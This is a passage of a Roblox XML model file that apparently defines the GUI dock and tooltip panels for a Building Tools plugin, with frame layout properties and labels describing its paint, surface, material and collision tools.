										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX99E3FD235C7B4D449EDBC4BE07524A8F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-20</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Go to Tools &gt; Manage Plugins or Plugins &gt; Manage Plugins to update plugins  :)</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBXEBFDD7BF825C460FBB54FB21489A9C70">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-48</int>
										</Properties>
									</Item>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX15BC677EF6AA4A9AB8DD7E4C3511CC37">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4278190080</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4280492835</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTDockGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>1</XS>
									<XO>-80</XO>
									<YS>0</YS>
									<YO>130</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>70</XO>
									<YS>0</YS>
									<YO>380</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX2A6BB7D5D30845518BDE0AF24F8A601F">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Tooltips</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>-120</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>120</XO>
										<YS>0</YS>
										<YO>315</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX8D2BCED445BA423BAB28ACEFB9C93878">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">PaintInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX6408C3148E6D47A6A2DD0987FCAB4A20">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>70</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXD89528E5921C4D608A891B62C7EEA63C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294901760</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX89B01CAC55664A63832ED2F8B0F7E36A">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>82</XO>
													<YS>0</YS>
													<YO>50</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Allows you to change the color of parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX689DC4869FB044FB9B27CEAB0B468523">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">PAINT TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX7EEFB936863443709D3A82ECB01F2A89">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">SurfaceInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXCBF2BFB3BEBF478490EDCBD76506F5CF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX6B5B68AB6C4D418B976053BCDFD4CF99">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4285215356</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX0E2E3AD1131944AD839FFB427F5846F7">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>82</XO>
													<YS>0</YS>
													<YO>120</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Lets you change the surface type of parts.

TIP: You can select the side to change by right clicking on a part's side.]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX58E1BDF530A54C0C9564683E76BA9D66">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">SURFACE TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX79FD915747A947BCA3CABF3FB8B08335">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">MaterialInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX9D76693DD6BB43E789724870F20BD8C3">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX10ED2C52B00F426896CF8641F728744C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4285215356</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXF6CDE36E9C35487884CD8DB17D5C65F3">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>120</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Lets you change the material, transparency, and reflectance of parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX66FD6F3CDEE941F0AF0AD0A80667ACA1">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">MATERIAL TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXF4A3624EFA4C42389BC3C3C7AD6BAAAD">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">CollisionInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX665207B56EEA43959B07E9BEFCAE0479">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX9D0B1DAFA3AD48F8AD1CDC75DAB9BBC8">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4279308561</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXA65B0896E1F641DD9AA5D821CFE1A7D4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
